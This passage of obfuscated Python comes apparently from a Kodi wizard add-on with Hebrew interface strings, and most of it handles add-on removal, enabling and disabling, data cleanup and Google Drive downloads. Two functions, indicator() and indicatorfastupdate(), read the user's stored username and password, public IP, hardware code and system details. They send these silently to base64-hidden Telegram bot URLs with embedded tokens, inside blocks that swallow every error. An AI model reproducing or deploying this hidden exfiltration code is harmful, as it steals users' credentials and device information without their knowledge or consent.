		if os .path .exists (OO0000OO00O00OOO0 ):#line:2935
			O0000O000O000O000 =open (OO0000OO00O00OOO0 )#line:2936
			O0O0O0OO0O00O0O0O =O0000O000O000O000 .read ()#line:2937
			O0OOOOO00OOO000OO =wiz .parseDOM (O0O0O0OO0O00O0O0O ,'addon',ret ='id')#line:2938
			OOOO0O0OOOO000O00 =OOOOOO0OOOOOOO0O0 if len (O0OOOOO00OOO000OO )==0 else O0OOOOO00OOO000OO [0 ]#line:2940
			try :#line:2941
				OOO0O0OO00000000O =xbmcaddon .Addon (id =OOOO0O0OOOO000O00 )#line:2942
				O00O00000O0O0OOO0 .append (OOO0O0OO00000000O .getAddonInfo ('name'))#line:2943
				O0OO000OO0O0000O0 .append (OOOO0O0OOOO000O00 )#line:2944
			except :#line:2945
				pass #line:2946
	if len (O00O00000O0O0OOO0 )==0 :#line:2947
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:2948
		return #line:2949
	if KODIV >16 :#line:2950
		OOO0O0OOOO00O000O =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,O00O00000O0O0OOO0 )#line:2951
	else :#line:2952
		OOO0O0OOOO00O000O =[];OO00000OO0O000OO0 =0 #line:2953
		O0OO000OOOOOO00O0 =["-- Click here to Continue --"]+O00O00000O0O0OOO0 #line:2954
		while not OO00000OO0O000OO0 ==-1 :#line:2955
			OO00000OO0O000OO0 =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,O0OO000OOOOOO00O0 )#line:2956
			if OO00000OO0O000OO0 ==-1 :break #line:2957
			elif OO00000OO0O000OO0 ==0 :break #line:2958
			else :#line:2959
				OO0OOOOO0O00O000O =(OO00000OO0O000OO0 -1 )#line:2960
				if OO0OOOOO0O00O000O in OOO0O0OOOO00O000O :#line:2961
					OOO0O0OOOO00O000O .remove (OO0OOOOO0O00O000O )#line:2962
					O0OO000OOOOOO00O0 [OO00000OO0O000OO0 ]=O00O00000O0O0OOO0 [OO0OOOOO0O00O000O ]#line:2963
				else :#line:2964
					OOO0O0OOOO00O000O .append (OO0OOOOO0O00O000O )#line:2965
					O0OO000OOOOOO00O0 [OO00000OO0O000OO0 ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O00O00000O0O0OOO0 [OO0OOOOO0O00O000O ])#line:2966
	if OOO0O0OOOO00O000O ==None :return #line:2967
	if len (OOO0O0OOOO00O000O )>0 :#line:2968
		wiz .addonUpdates ('set')#line:2969
		for OOO0OO0OOO00000OO in OOO0O0OOOO00O000O :#line:2970
			removeAddon (O0OO000OO0O0000O0 [OOO0OO0OOO00000OO ],O00O00000O0O0OOO0 [OOO0OO0OOO00000OO ],True )#line:2971
		xbmc .sleep (1000 )#line:2973
		if INSTALLMETHOD ==1 :O000O0OOO0OO0O0O0 =1 #line:2975
		elif INSTALLMETHOD ==2 :O000O0OOO0OO0O0O0 =0 #line:2976
		else :O000O0OOO0OO0O0O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:2977
		if O000O0OOO0OO0O0O0 ==1 :wiz .reloadFix ('remove addon')#line:2978
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:2979
def removeAddonDataMenu ():#line:2981
	if os .path .exists (ADDOND ):#line:2982
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:2983
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:2984
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:2985
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:2986
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2987
		OO00OO00OO0OOO0OO =glob .glob (os .path .join (ADDOND ,'*/'))#line:2988
		for O00O0O00000000OO0 in sorted (OO00OO00OO0OOO0OO ,key =lambda OOOO0O000OOO00OOO :OOOO0O000OOO00OOO ):#line:2989
			O0OOO0O0O0O0OOO00 =O00O0O00000000OO0 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:2990
			O0OOO0OO0OOOOO0OO =os .path .join (O00O0O00000000OO0 .replace (ADDOND ,ADDONS ),'icon.png')#line:2991
			O0OO00O0OOOO000O0 =os .path .join (O00O0O00000000OO0 .replace (ADDOND ,ADDONS ),'fanart.png')#line:2992
			O00O000O0OOO00OO0 =O0OOO0O0O0O0OOO00 #line:2993
			OO00O00O000OO0OO0 ={'audio.':'[COLOR silver][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR silver][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR silver][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR silver][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:2994
			for O00O0OOO0OO00000O in OO00O00O000OO0OO0 :#line:2995
				O00O000O0OOO00OO0 =O00O000O0OOO00OO0 .replace (O00O0OOO0OO00000O ,OO00O00O000OO0OO0 [O00O0OOO0OO00000O ])#line:2996
			if O0OOO0O0O0O0OOO00 in EXCLUDES :O00O000O0OOO00OO0 ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%O00O000O0OOO00OO0 #line:2997
			else :O00O000O0OOO00OO0 ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%O00O000O0OOO00OO0 #line:2998
			addFile (' %s'%O00O000O0OOO00OO0 ,'removedata',O0OOO0O0O0O0OOO00 ,icon =O0OOO0OO0OOOOO0OO ,fanart =O0OO00O0OOOO000O0 ,themeit =THEME2 )#line:2999
	else :#line:3000
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3001
	setView ('files','viewType')#line:3002
def enableAddons ():#line:3004
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3005
	OOOOOOO0OO00000OO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3006
	OO0OOO0OOO00O0000 =0 #line:3007
	for O0OO000O000OOO00O in sorted (OOOOOOO0OO00000OO ,key =lambda OOO000OOO000O00O0 :OOO000OOO000O00O0 ):#line:3008
		OOOOOOO000OOO0000 =os .path .split (O0OO000O000OOO00O [:-1 ])[1 ]#line:3009
		if OOOOOOO000OOO0000 in EXCLUDES :continue #line:3010
		if OOOOOOO000OOO0000 in DEFAULTPLUGINS :continue #line:3011
		O0O00O0OOOOO000OO =os .path .join (O0OO000O000OOO00O ,'addon.xml')#line:3012
		if os .path .exists (O0O00O0OOOOO000OO ):#line:3013
			OO0OOO0OOO00O0000 +=1 #line:3014
			OOOOOOO0OO00000OO =O0OO000O000OOO00O .replace (ADDONS ,'')[1 :-1 ]#line:3015
			OOO0O0OOO000OOO00 =open (O0O00O0OOOOO000OO )#line:3016
			OOO000O0000OOOOO0 =OOO0O0OOO000OOO00 .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3017
			O00OO0O0OOOO000O0 =wiz .parseDOM (OOO000O0000OOOOO0 ,'addon',ret ='id')#line:3018
			OOO0O000OOOOO0O0O =wiz .parseDOM (OOO000O0000OOOOO0 ,'addon',ret ='name')#line:3019
			try :#line:3020
				OO0O000OOOO0O00OO =O00OO0O0OOOO000O0 [0 ]#line:3021
				OO0O00O0O00O000OO =OOO0O000OOOOO0O0O [0 ]#line:3022
			except :#line:3023
				continue #line:3024
			try :#line:3025
				OOOO000000OO0O000 =xbmcaddon .Addon (id =OO0O000OOOO0O00OO )#line:3026
				O0000O00O000OOOO0 ="[COLOR green][Enabled][/COLOR]"#line:3027
				OO0000OOO0O0OOOO0 ="false"#line:3028
			except :#line:3029
				O0000O00O000OOOO0 ="[COLOR red][Disabled][/COLOR]"#line:3030
				OO0000OOO0O0OOOO0 ="true"#line:3031
				pass #line:3032
			O00O00000O0O00OO0 =os .path .join (O0OO000O000OOO00O ,'icon.png')if os .path .exists (os .path .join (O0OO000O000OOO00O ,'icon.png'))else ICON #line:3033
			O0000OO0O000000OO =os .path .join (O0OO000O000OOO00O ,'fanart.jpg')if os .path .exists (os .path .join (O0OO000O000OOO00O ,'fanart.jpg'))else FANART #line:3034
			addFile ("%s %s"%(O0000O00O000OOOO0 ,OO0O00O0O00O000OO ),'toggleaddon',OOOOOOO0OO00000OO ,OO0000OOO0O0OOOO0 ,icon =O00O00000O0O00OO0 ,fanart =O0000OO0O000000OO )#line:3035
			OOO0O0OOO000OOO00 .close ()#line:3036
	if OO0OOO0OOO00O0000 ==0 :#line:3037
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3038
	setView ('files','viewType')#line:3039
def changeFeq ():#line:3041
	O00O00O00O0000OOO =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3042
	O0OO000OO00O0OOOO =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,O00O00O00O0000OOO )#line:3043
	if not O0OO000OO00O0OOOO ==-1 :#line:3044
		wiz .setS ('autocleanfeq',str (O0OO000OO00O0OOOO ))#line:3045
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,O00O00O00O0000OOO [O0OO000OO00O0OOOO ]))#line:3046
def developer ():#line:3048
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3049
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3050
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3051
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3052
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3053
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3054
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3055
	setView ('files','viewType')#line:3057
def dis_or_enable_addon (OO00000000O0O0OO0 ,O0O00O0O0OOO0OO00 ,enable ="true"):#line:3063
    import json #line:3064
    OO00O0OO0O0OO0000 ='"%s"'%OO00000000O0O0OO0 #line:3065
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OO00000000O0O0OO0 )and enable =="true":#line:3066
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OO00000000O0O0OO0 )#line:3068
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OO00000000O0O0OO0 )and enable =="false":#line:3069
        return xbmc .log ("### Skipped %s, reason = not installed"%OO00000000O0O0OO0 )#line:3070
    else :#line:3071
        O00000OO0OO0O0O0O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OO00O0OO0O0OO0000 ,enable )#line:3072
        O0O0O0O0OOO0O0OO0 =xbmc .executeJSONRPC (O00000OO0OO0O0O0O )#line:3073
        O0O0O00000OO00O00 =json .loads (O0O0O0O0OOO0O0OO0 )#line:3074
        if enable =="true":#line:3075
            xbmc .log ("### Enabled %s, response = %s"%(OO00000000O0O0OO0 ,O0O0O00000OO00O00 ))#line:3076
        else :#line:3077
            xbmc .log ("### Disabled %s, response = %s"%(OO00000000O0O0OO0 ,O0O0O00000OO00O00 ))#line:3078
    if O0O00O0O0OOO0OO00 =='auto':#line:3079
     return True #line:3080
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3081
def chunk_report (O00O00OOO000000O0 ,OO000000OO00O0OO0 ,OOOO0O00OO0OO00OO ):#line:3082
   O00OOO000OO0O00OO =float (O00O00OOO000000O0 )/OOOO0O00OO0OO00OO #line:3083
   O00OOO000OO0O00OO =round (O00OOO000OO0O00OO *100 ,2 )#line:3084
   if O00O00OOO000000O0 >=OOOO0O00OO0OO00OO :#line:3086
      sys .stdout .write ('\n')#line:3087
def googledrive_download (O00000000O0O00OO0 ,OO000OO0O00000OOO ,O0O0OOO0000O0O00O ,OOOOO00O0OO0OOOO0 ):#line:3090
    import urllib .request #line:3092
    import sys #line:3093
    import io ,time #line:3094
    O0OOOOO0O000OO000 =O00000000O0O00OO0 .split ('=')#line:3095
    O00000000O0O00OO0 =O0OOOOO0O000OO000 [len (O0OOOOO0O000OO000 )-1 ]#line:3096
    OO0OO0O0OO00000OO ={'authority':'drive.google.com','content-length':'0','cache-control':'max-age=0','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"','sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"','upgrade-insecure-requests':'1','origin':'https://drive.google.com','content-type':'application/x-www-form-urlencoded','user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site':'same-origin','sec-fetch-mode':'navigate','sec-fetch-user':'?1','sec-fetch-dest':'document','referer':'https://drive.google.com/uc?id=%s&export=download'%O00000000O0O00OO0 ,'accept-language':'he-IL,he;q=0.9',}#line:3115
    O00OO0O00O0O0O00O ='https://drive.google.com/uc?id=%s&export=download&confirm=t'%O00000000O0O00OO0 #line:3117
    OO0O0O00OOOOO0000 =urllib .request .Request (O00OO0O00O0O0O00O ,headers =OO0OO0O0OO00000OO )#line:3118
    OOO00O00OO0000OOO =urllib .request .urlopen (OO0O0O00OOOOO0000 )#line:3119
    OOOO0O0O00OOOO0O0 =OOO00O00OO0000OOO .getheader ('content-length')#line:3120
    if OOOO0O0O00OOOO0O0 :#line:3121
        OOOO0O0O00OOOO0O0 =int (OOOO0O0O00OOOO0O0 )#line:3122
        O00O0O00OOOO0000O =max (4096 ,OOOO0O0O00OOOO0O0 //100 )#line:3123
    else :#line:3124
        O00O0O00OOOO0000O =1000000 #line:3125
    O00000O0O00OOOOO0 =io .BytesIO ()#line:3129
    OOO00OO0000OOOOO0 =0 #line:3130
    with open (OO000OO0O00000OOO ,"wb")as OOOO0O0000000OO0O :#line:3132
      O0O0000O000O00O0O =1 #line:3133
      OOO0OOO00OOOOOOOO =time .time ()#line:3134
      while 1 :#line:3135
        O0OO00OOO00000O00 =OOO00O00OO0000OOO .read (O00O0O00OOOO0000O )#line:3136
        if not O0OO00OOO00000O00 :#line:3137
            break #line:3138
        OOOO0O0000000OO0O .write (O0OO00OOO00000O00 )#line:3139
        OOOO0O0000000OO0O .flush ()#line:3140
        OOO00OO0000OOOOO0 +=len (O0OO00OOO00000O00 )#line:3141
        O000O00OO000OO0OO =time .time ()-OOO0OOO00OOOOOOOO #line:3142
        OOOOOOO0OO00OOO0O =int (O0O0000O000O00O0O *O00O0O00OOOO0000O )#line:3143
        OOO00OOO0000O000O =int ((OOOOOOO0OO00OOO0O )/(1024 *O000O00OO000OO0OO ))#line:3145
        OO0OOOOOO000OO0O0 =int (O0O0000O000O00O0O *O00O0O00OOOO0000O *100 /OOOO0O0O00OOOO0O0 )#line:3146
        if OOO00OOO0000O000O >1024 and not OO0OOOOOO000OO0O0 ==100 :#line:3147
          OO0OOOOO00OOO000O =int (((OOOO0O0O00OOOO0O0 -OOOOOOO0OO00OOO0O )/1024 )/(OOO00OOO0000O000O ))#line:3148
        else :#line:3149
          OO0OOOOO00OOO000O =0 #line:3150
        O0O0000O000O00O0O +=1 #line:3152
        O0O0OOO0000O0O00O .update (int (OO0OOOOOO000OO0O0 ),"\r%d%%,[COLOR yellow] %d MB / %d MB [/COLOR], %d KB/s "%(OO0OOOOOO000OO0O0 ,OOOOOOO0OO00OOO0O /(1024 *1024 ),OOOO0O0O00OOOO0O0 /(1000 *1000 ),OOO00OOO0000O000O )+'\n'+'[B]ETA:[/B] [COLOR yellow]%02d:%02d[/COLOR]'%divmod (OO0OOOOO00OOO000O ,60 ))#line:3153
        if O0O0OOO0000O0O00O .iscanceled ():#line:3156
         O0O0OOO0000O0O00O .close ()#line:3157
         break #line:3158
def googledrive_download_BG (O0OOOO0000O0O0O00 ,O0O0O0O000OOO0OOO ,OOOOO0OO0OO00OOOO ,OO000OO00OOOO0O0O ):#line:3160
    OOOOO0OO0OO00OOOO .create ('[B][COLOR=green]מוריד עדכון מערכת                         [/COLOR][/B]')#line:3162
    import urllib .request #line:3163
    import sys #line:3164
    import io ,time #line:3165
    O00OO0OO000OOOO0O =O0OOOO0000O0O0O00 .split ('=')#line:3166
    O0OOOO0000O0O0O00 =O00OO0OO000OOOO0O [len (O00OO0OO000OOOO0O )-1 ]#line:3167
    OOOOOO00O00O0O0OO ={'authority':'drive.google.com','content-length':'0','cache-control':'max-age=0','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"','sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"','upgrade-insecure-requests':'1','origin':'https://drive.google.com','content-type':'application/x-www-form-urlencoded','user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site':'same-origin','sec-fetch-mode':'navigate','sec-fetch-user':'?1','sec-fetch-dest':'document','referer':'https://drive.google.com/uc?id=%s&export=download'%O0OOOO0000O0O0O00 ,'accept-language':'he-IL,he;q=0.9',}#line:3186
    OOOOOO00OO00O00O0 ='https://drive.google.com/uc?id=%s&export=download&confirm=t'%O0OOOO0000O0O0O00 #line:3188
    O0OO0O0OOOOO000OO =urllib .request .Request (OOOOOO00OO00O00O0 ,headers =OOOOOO00O00O0O0OO )#line:3189
    O000OOOOOOOOOO000 =urllib .request .urlopen (O0OO0O0OOOOO000OO )#line:3190
    O000OO00O0O0OO0O0 =O000OOOOOOOOOO000 .getheader ('content-length')#line:3191
    if O000OO00O0O0OO0O0 :#line:3192
        O000OO00O0O0OO0O0 =int (O000OO00O0O0OO0O0 )#line:3193
        OO0OO000OO00OO0OO =max (4096 ,O000OO00O0O0OO0O0 //100 )#line:3194
    else :#line:3195
        OO0OO000OO00OO0OO =1000000 #line:3196
    OOO000O000OOOOOOO =io .BytesIO ()#line:3200
    O000O0O00OO000O00 =0 #line:3201
    with open (O0O0O0O000OOO0OOO ,"wb")as O00O0000O0O000000 :#line:3203
      OO000OO0O0O0OO0O0 =1 #line:3204
      OO0O0O0OOO0O00OOO =time .time ()#line:3205
      while 1 :#line:3206
        OOO0O0OOO000OO0OO =O000OOOOOOOOOO000 .read (OO0OO000OO00OO0OO )#line:3207
        if not OOO0O0OOO000OO0OO :#line:3208
            break #line:3209
        O00O0000O0O000000 .write (OOO0O0OOO000OO0OO )#line:3210
        O00O0000O0O000000 .flush ()#line:3211
        O000O0O00OO000O00 +=len (OOO0O0OOO000OO0OO )#line:3212
        O000O0OOOOO00OO00 =time .time ()-OO0O0O0OOO0O00OOO #line:3213
        O0OOOO0O00OO0OOO0 =int (OO000OO0O0O0OO0O0 *OO0OO000OO00OO0OO )#line:3214
        O0O0O00000OOOOO00 =int ((O0OOOO0O00OO0OOO0 )/(1024 *O000O0OOOOO00OO00 ))#line:3216
        O00O00O00O000O000 =int (OO000OO0O0O0OO0O0 *OO0OO000OO00OO0OO *100 /O000OO00O0O0OO0O0 )#line:3217
        if O0O0O00000OOOOO00 >1024 and not O00O00O00O000O000 ==100 :#line:3218
          O0000000000OO0O0O =int (((O000OO00O0O0OO0O0 -O0OOOO0O00OO0OOO0 )/1024 )/(O0O0O00000OOOOO00 ))#line:3219
        else :#line:3220
          O0000000000OO0O0O =0 #line:3221
        OO000OO0O0O0OO0O0 +=1 #line:3223
        OOOOO0OO0OO00OOOO .update (int (O00O00O00O000O000 ),"\r%d%%,[COLOR yellow] %d MB / %d MB [/COLOR], %d KB/s "%(O00O00O00O000O000 ,O0OOOO0O00OO0OOO0 /(1024 *1024 ),O000OO00O0O0OO0O0 /(1000 *1000 ),O0O0O00000OOOOO00 ),'[B]זמן שנותר: [/B][COLOR yellow]%02d:%02d[/COLOR]'%divmod (O0000000000OO0O0O ,60 ))#line:3224
def indicator ():#line:3229
       try :#line:3233
          import json #line:3234
          OOO0O0OOOOO0OOO00 =wiz .getS ("date_user")#line:3235
          wiz .log ('FRESH MESSAGE')#line:3236
          OO0OO0OO0O0O0O0O0 =(wiz .getS ("user"))#line:3237
          O0O0O00O0OOOOO0OO =(wiz .getS ("pass"))#line:3238
          OO000000O00O0OOO0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3239
          O00OO0O00OOO0OOOO =platform .uname ()#line:3240
          O000OOOOO0O0OO0OO =O00OO0O00OOO0OOOO [1 ]#line:3241
          if wiz .getS ('dragon')=='true':#line:3242
                O00O0OO0O00O00O00 =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDUyMzY2MjUxODY6QUFGWWswSVBCdTROWjJ1WmxQWXpidVA5NkZyZ1B0UDhnUU0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTc4ODIyNzI2MSZ0ZXh0PQ==').decode ('utf-8')#line:3243
          else :#line:3244
                O00O0OO0O00O00O00 =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ9').decode ('utf-8')#line:3245
          OOOOOOOOOO0000000 =urlopen ('https://api.ipify.org/?format=json').read ()#line:3246
          O00000O0000O0000O =str (json .loads (OOOOOOOOOO0000000 )['ip'])#line:3247
          O00OO00OO0OO0O0OO =OO0OO0OO0O0O0O0O0 #line:3248
          O0O0O0OO00OO0OO0O =O0O0O00O0OOOOO0OO #line:3249
          import socket #line:3250
          OOOOOOOOOO0000000 =urlopen (O00O0OO0O00O00O00 +que ('התקין: ')+que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+O00OO00OO0OO0O0OO +que (' סיסמה: ')+O0O0O0OO00OO0OO0O +que (' קודי: ')+OO000000O00O0OOO0 +que (' כתובת: ')+O00000O0000O0000O +que (' מערכת הפעלה: ')+wiz .platform_d ()+que (' שם המערכת: ')+O000OOOOO0O0OO0OO +que (' גירסת ויזארד: ')+VERSION +que (' מנוי: ')+OOO0O0OOOOO0OOO00 ).readlines ()#line:3252
       except :pass #line:3253
def indicatorfastupdate (info =''):#line:3255
       try :#line:3256
          import json #line:3257
          OOO000O00000OO0O0 =wiz .getS ("date_user")#line:3258
          wiz .log ('FRESH MESSAGE')#line:3259
          O00000OO0OO000O00 =(wiz .getS ("user"))#line:3260
          OO0OO0O00O00OO0OO =(wiz .getS ("pass"))#line:3261
          OOOOO00O00OO00000 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3262
          O000000OO0OO000OO =platform .uname ()#line:3263
          O000000OO0OOOOOOO =O000000OO0OO000OO [1 ]#line:3264
          if wiz .getS ('dragon')=='true':#line:3266
            O00O0OO0OOO0OO00O =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDU4MDUzMzM1NzpBQUVzTjZPLU5QN05IU1B0eHc2UTZpVnVEa2dhZU1aUU1nOC9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNTcwNzQ3MjI0JnRleHQ9').decode ('utf-8')#line:3267
          else :#line:3268
            O00O0OO0OOO0OO00O =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0=').decode ('utf-8')#line:3269
          O0O0OOO0000O00OO0 =urlopen ('https://api.ipify.org/?format=json').read ()#line:3270
          O000O0O00OOO0O0OO =str (json .loads (O0O0OOO0000O00OO0 )['ip'])#line:3271
          O0O00O0OO0O0O0O0O =O00000OO0OO000O00 #line:3272
          O00OOOOOO0OOO00O0 =OO0OO0O00O00OO0OO #line:3273
          import socket #line:3275
          O0O0OOO0000O00OO0 =urlopen (O00O0OO0OOO0OO00O +que ('עדכון מהיר ')+que (info )+que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+O0O00O0OO0O0O0O0O +que (' סיסמה: ')+O00OOOOOO0OOO00O0 +que (' קודי: ')+OOOOO00O00OO00000 +que (' כתובת: ')+O000O0O00OOO0O0OO +que (' מערכת הפעלה: ')+wiz .platform_d ()+que (' שם המערכת: ')+O000000OO0OOOOOOO +que (' גירסת ויזארד: ')+VERSION +que (' מנוי: ')+OOO000O00000OO0O0 ).readlines ()#line:3276
       except :pass #line:3279
def del_addon_db ():#line:3281
    if KODI_VERSION <=18 :#line:3282
        try :#line:3283
            os .remove (os .path .join (translatepath ("special://userdata/"),"Database","Addons33.db"))#line:3284
        except :#line:3285
            pass #line:3286
    else :#line:3287
        try :#line:3288
            os .remove (os .path .join (translatepath ("special://userdata/"),"Database","Addons27.db"))#line:3289
        except :#line:3290
            pass #line:3291
def skin_homeselect ():#line:3295
    O000O00O0OOOO0O00 =os .path .join (translatepath ("special://masterprofile/"),"addon_data","skin.Premium.mod","settings.xml")#line:3296
    if KODI_VERSION <=18 :#line:3297
        O0OOO0O0O00O0000O =open (O000O00O0OOOO0O00 ,'r')#line:3298
        OOO0OOO0000OO0OO0 =O0OOO0O0O00O0000O .read ()#line:3299
        O0OOO0O0O00O0000O .close ()#line:3300
    else :#line:3301
        O0OOO0O0O00O0000O =open (O000O00O0OOOO0O00 ,'r',encoding ='utf-8')#line:3302
        OOO0OOO0000OO0OO0 =O0OOO0O0O00O0000O .read ()#line:3303
        O0OOO0O0O00O0000O .close ()#line:3304
    try :#line:3305
        O0000O0OO0OOO0000 ='<setting id="FirstRunSetup" type="bool">(.+?)</setting>'#line:3306
        O0000OO0O00OOOO0O =re .compile (O0000O0OO0OOO0000 ).findall (OOO0OOO0000OO0OO0 )[0 ]#line:3307
        if KODI_VERSION <=18 :#line:3308
            O0OOO0O0O00O0000O =open (O000O00O0OOOO0O00 ,'w')#line:3309
            O0OOO0O0O00O0000O .write (OOO0OOO0000OO0OO0 .replace ('<setting id="FirstRunSetup" type="bool">%s</setting>'%O0000OO0O00OOOO0O ,'<setting id="FirstRunSetup" type="bool">false</setting>'))#line:3310
            O0OOO0O0O00O0000O .close ()#line:3311
        else :#line:3312
            O0OOO0O0O00O0000O =open (O000O00O0OOOO0O00 ,'w',encoding ='utf-8')#line:3313
            O0OOO0O0O00O0000O .write (OOO0OOO0000OO0OO0 .replace ('<setting id="FirstRunSetup" type="bool">%s</setting>'%O0000OO0O00OOOO0O ,'<setting id="FirstRunSetup" type="bool">false</setting>'))#line:3314
            O0OOO0O0O00O0000O .close ()#line:3315
    except :pass #line:3316
def download_file (OOOOO0O00000OO0OO ,OOOO0OOOO0OO00OO0 ):#line:3317
    import sys #line:3318
    O0OO0000OOO00OO0O =translatepath ('special://home/addons/script.module.requests/lib')#line:3319
    sys .path .append (O0OO0000OOO00OO0O )#line:3320
    O0OO0000OOO00OO0O =translatepath ('special://home/addons/script.module.urllib3/lib')#line:3321
    sys .path .append (O0OO0000OOO00OO0O )#line:3322
    O0OO0000OOO00OO0O =translatepath ('special://home/addons/script.module.chardet/lib')#line:3323
    sys .path .append (O0OO0000OOO00OO0O )#line:3324
    O0OO0000OOO00OO0O =translatepath ('special://home/addons/script.module.certifi/lib')#line:3325
    sys .path .append (O0OO0000OOO00OO0O )#line:3326
    O0OO0000OOO00OO0O =translatepath ('special://home/addons/script.module.idna/lib')#line:3327
    sys .path .append (O0OO0000OOO00OO0O )#line:3328
    O0OO0000OOO00OO0O =translatepath ('special://home/addons/script.module.futures/lib')#line:3329
    sys .path .append (O0OO0000OOO00OO0O )#line:3330
    import requests #line:3331
    OO0000OOO000O0OOO =OOOOO0O00000OO0OO .split ('/')[-1 ]#line:3333
    if '?'in OO0000OOO000O0OOO :#line:3334
        OO0000OOO000O0OOO =OO0000OOO000O0OOO .split ('?')[0 ]#line:3335
    OO0000OOO000O0OOO =os .path .join (OOOO0OOOO0OO00OO0 ,OO0000OOO000O0OOO )#line:3336
    with requests .get (OOOOO0O00000OO0OO ,stream =True )as O000OO00OO0OO0OO0 :#line:3338
        O000OO00OO0OO0OO0 .raise_for_status ()#line:3339
        with open (OO0000OOO000O0OOO ,'wb')as OO000OO00OO0000O0 :#line:3340
            for OO000O0O00OO0O0OO in O000OO00OO0OO0OO0 .iter_content (chunk_size =8192 ):#line:3341
                OO000OO00OO0000O0 .write (OO000O0O00OO0O0OO )#line:3345
    return OO0000OOO000O0OOO #line:3346
def tdlib (force =False ):#line:3347
